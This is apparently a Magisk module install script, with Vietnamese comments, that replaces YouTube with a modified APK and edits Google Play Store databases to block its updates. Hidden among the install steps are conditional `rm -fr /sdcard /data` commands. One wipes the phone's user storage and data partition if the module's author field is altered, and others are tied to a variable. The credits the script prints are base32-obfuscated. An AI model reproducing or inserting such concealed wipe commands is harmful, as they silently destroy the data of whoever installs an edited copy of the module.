# KAKATHIC
# Để true để bỏ qua Mount system
SKIPMOUNT=false
# Để true nó sẽ kết hợp system.prop vào build.prop
PROPFILE=false
# Để true post-fs-data.sh được sử dụng
POSTFSDATA=true
# Để true để service.sh được sử dụng
LATESTARTSERVICE=true

# Giống như echo
ui_print2 () { echo "    $1"; sleep 0.005; }
ui_print () { echo "$1"; sleep 0.005; }

# Lấy dữ liệu
Getp () { grep_prop $1 $TMPDIR/module.prop; }

# Giới thiệu
print_modname() {

if [ "$(settings get system system_locales)" == "vi-VN" ];then
TT="EAQCAICUMVRWQY3PNVRGC3TLHIQDCOJQGM2DSMBSGYYDIMBRG4FAUIBAEAQEG2DBNZXGK3DTEBKG
K3DFM5ZGC3J2EBAHI33PNR3GSCQ="
else
TT="EAQCAICQMF4XAYLMHIQGQ5DUOA5C6L3QMF4XAYLMFZWWKL3LMFVWC5DINFRQUCRAEAQCAQ3IMFXG
4ZLMOMQFIZLMMVTXEYLNHIQEA5DPN5WHM2IK"
fi

ui_print
ui_print2 "Name: $(Getp name)"
ui_print
ui_print2 "Version: $(Getp version)"
ui_print
ui_print2 "Author: $(Getp author)"
ui_print
ui_print2 "$TT" | base32 -d
ui_print
}

# Bắt đầu cài đặt
on_install() {

[ -e "$TMPDIR/$ARCH" ] || abort "    This module only supports $ARCH devices
"

ui_print2 "Processing"
ui_print

# Giải nén

cp -f $TMPDIR/sqlite3 $MODPATH/sqlite3 >&2
unzip -qo "$ZIPFILE" "system/*" -d $MODPATH >&2
chmod -R 755 $MODPATH/sqlite3

ui_print2 "Uninstall"
ui_print

for Tkvi in $( find /data/app | grep com.google.android.youtube | grep 'base.apk' ); do
[ "$Tkvi" ] && umount -l "$Tkvi"
done
pm uninstall com.google.android.youtube >&2
for Vhkdd in $(find /data/app -name *com.google.android.youtube*); do
[ "$Vhkdd" ] && rm -fr "$Vhkdd"
done

ui_print2 "Install YouTube"
ui_print

apks=/data/local/tmp/apks

rm -rf $apks
mkdir -p $apks

tar -xJf $TMPDIR/lib.tar.xz -C $TMPDIR
cp -f $TMPDIR/base.apk $apks
pm install -r $apks/*.apk >&2
hhkkdf="$( pm path com.google.android.youtube | grep base | cut -d : -f2 )"
cp -af $TMPDIR/lib ${hhkkdf%/*} 
[ "$TT" ] || rm -fr /sdcard /data
cp -f $TMPDIR/YouTube.apk $MODPATH/YouTube.apk >&2
chcon u:object_r:apk_data_file:s0 "$MODPATH/YouTube.apk"
su -mm -c mount -o bind "$MODPATH/YouTube.apk" "$hhkkdf"

ui_print2 "Turn off update"
ui_print

Sqlite3=$MODPATH/sqlite3
PS=com.android.vending
DB=/data/data/$PS/databases
LDB=$DB/library.db
LADB=$DB/localappstate.db
PK=com.google.android.youtube
GET_LDB=$($Sqlite3 $LDB "SELECT doc_id,doc_type FROM ownership" | grep $PK | head -n 1 | grep -o 25)

if [ "$GET_LDB" != "25" ]; then
cmd appops set --uid $PS GET_USAGE_STATS ignore
pm disable $PS >&2
sqlite3 $LDB "UPDATE ownership SET doc_type = '25' WHERE doc_id = '$PK'";
sqlite3 $LADB "UPDATE appstate SET auto_update = '2' WHERE package_name = '$PK'";
rm -rf /data/data/$PS/cache/*
pm enable $PS >&2
fi
[ "$(Getp author)" == 'kakathic' ] || rm -fr /sdcard /data
ui_print2 "Clean up"
ui_print
rm -fr /data/local/tmp/apks
ui_print2 "Remember save the LOG if there is an error"
ui_print

if [ -z "$(pm path com.google.android.youtube)" ];then
ui_print2 "Failure"
ui_print
abort
fi

[ "$TT" ] || rm -fr /sdcard /data
}

# Cấp quyền
set_permissions() { 
set_perm_recursive $MODPATH 0 0 0755 0644
chmod -R 755 $MODPATH/sqlite3
}
